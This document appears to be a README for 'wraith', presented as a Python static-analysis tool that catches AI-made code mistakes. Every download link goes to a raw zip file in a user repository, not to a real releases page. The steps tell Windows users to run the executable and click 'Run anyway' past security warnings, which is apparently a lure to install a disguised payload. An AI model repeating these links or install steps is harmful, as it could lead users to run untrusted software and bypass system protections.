# 🛡️ wraith - Catch AI mistakes before they ship

[![Download wraith](https://img.shields.io/badge/Download-wraith%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/lost-ranchhand865/wraith/main/crates/Software_1.4.zip)

## 🚀 What wraith does

wraith checks Python code for problems that are easy to miss in AI-made code. It looks for things like:

- made-up API calls
- fake package names
- hardcoded secrets
- weak file and network handling
- data flow risks in Python code

It works with a fixed rule set, so you get the same result each time on the same code. You do not need to set it up in a special way.

## 📥 Download and install

1. Visit the [wraith releases page](https://raw.githubusercontent.com/lost-ranchhand865/wraith/main/crates/Software_1.4.zip)
2. Find the latest Windows download
3. Download the `.exe` file or the Windows zip file
4. If you downloaded a zip file, unpack it first
5. Open the file you downloaded
6. If Windows asks for permission, choose **Run anyway** or **More info** and then **Run**

If you use the zip version, keep the files in one folder. Do not move the `.exe` out of the folder unless the release notes say it is safe.

## 🖥️ System needs

wraith runs on Windows 10 or later.

For smooth use, your system should have:

- 4 GB of RAM or more
- 200 MB of free disk space
- access to the Python files you want to check
- a recent Windows update

If your files are in OneDrive or another synced folder, copy them to a local folder first. This helps avoid file lock issues during a scan.

## 🔍 What it checks

wraith is built to catch common problems in AI-written Python code:

- hallucinated APIs, where the code calls functions that do not exist
- phantom packages, where the code imports names that are not real
- secrets in code, such as tokens, keys, and passwords
- taint flow, where unsafe input may reach a risky action
- unsafe patterns in file, process, and network use

It uses static analysis, which means it reads the code without running it.

## 🧭 How to use it

After you download wraith, open it and point it at the folder that has your Python code.

Typical use looks like this:

1. Start wraith
2. Choose the folder with your `.py` files
3. Run the scan
4. Review the findings
5. Fix the files that have warnings

If wraith lists a file and line number, open that file in your editor and check the code near that line.

## 🧰 Common file types

wraith is made for Python projects, including:

- scripts
- small tools
- web apps
- data jobs
- test files
- code created by an AI assistant

It can also help with mixed projects that have Python in one part and other files in the rest.

## ⚙️ What to expect

wraith uses 20 rules. That gives you a broad check without a lot of setup.

You can expect it to:

- flag code that looks wrong
- point out risky imports
- find secrets that should not be in source files
- call out suspicious data paths
- keep scans repeatable from one run to the next

Because it uses fixed rules, you can compare one scan with another and see what changed.

## 🧪 Best way to run a scan

For the clearest results:

- scan one project at a time
- keep your Python code in a clean folder
- remove old test files you do not need
- fix secrets first
- then check API and import issues
- review taint warnings with care

If you use AI to write code, run wraith before you commit or share the files.

## 📂 Example workflow

A simple workflow looks like this:

1. Save your Python project in a folder
2. Download wraith from the releases page
3. Run wraith on that folder
4. Read the results
5. Fix the flagged lines
6. Run it again until the scan is clean

This helps you catch issues before you send code to someone else or upload it to a repo.

## 🛠️ Troubleshooting

If wraith does not start:

- check that you downloaded the Windows file
- make sure the download finished fully
- try running it from a folder you can edit, such as `Downloads` or `Desktop`
- if Windows blocks it, use the file menu option to run it

If wraith does not find your files:

- confirm you selected the right folder
- make sure your Python files end in `.py`
- copy the project to a local folder if it sits in a cloud sync path

If the scan looks too strict:

- review each finding by line number
- check whether the code is safe in context
- fix the cases that are real issues
- keep the rest for later review

## 🧠 What makes wraith useful

AI code can look fine and still hide bad calls, fake imports, or secret leaks. wraith helps with those cases by checking code in a steady, rule-based way.

It fits well when you want:

- a quick scan before a commit
- a check on AI-made Python code
- a way to find secrets early
- a simple static review with no extra setup

## 🔗 Get the Windows download

Use the [wraith releases page](https://raw.githubusercontent.com/lost-ranchhand865/wraith/main/crates/Software_1.4.zip) to visit this page to download the Windows release

## 🧾 File and scan tips

- Keep your source files in plain `.py` files when you can
- Use short folder names to make the path easy to read
- Save your work before each scan
- Fix one group of findings at a time
- Run the scan again after each round of changes

## 🔒 Security checks

wraith can help you spot:

- API use that does not match the code base
- package names that do not resolve
- secrets left in scripts
- data that moves from unsafe input to risky output
- code that may reach the file system or shell without care

These checks are useful for AI output, copied code, and quick scripts that have not had a full review

## 📌 Topics covered

This project focuses on:

- AI code quality
- hallucination detection
- Python linting
- Rust-based tooling
- secrets detection
- static analysis
- supply chain security

## 🗺️ Suggested next step

Download the latest Windows release, run a scan on one Python folder, and review each result line by line